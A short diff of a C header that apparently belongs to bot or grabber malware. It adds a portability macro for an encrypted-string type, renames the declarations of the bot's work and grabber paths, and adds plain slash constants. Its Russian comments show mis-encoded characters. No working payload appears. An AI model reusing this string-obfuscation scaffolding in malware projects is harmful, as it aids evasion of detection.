@@ -12,7 +12,11 @@
 #include "Strings.h"
 
 //тип кодируемой строки, выравниваетс€ в один байт
-#define CSSTR __declspec(align(1)) char
+#ifdef _MSC_VER
+#	define CSSTR __declspec(align(1)) char
+#else
+#	define CSSTR char
+#endif
 
 //*****************************************************
 // GetStr - ‘ункци€ расшифровывает строку EncryptedStr
@@ -24,10 +28,15 @@ string GetStr(const char* EncryptedStr);
 
 
 //=====================================================
-//  ѕубличное обх€вление строковых данных
+//  ѕубличное объ€вление строковых данных
 //=====================================================
-extern CSSTR BotWorkPath[];
-extern CSSTR GrabberPath[];
+extern CSSTR StrBotWorkPath[];
+extern CSSTR StrGrabberPath[];
+
+
+//Ќе шифрованные строки и данные
+extern CSSTR Slash[];
+extern CSSTR SlashChar;
 
 
 
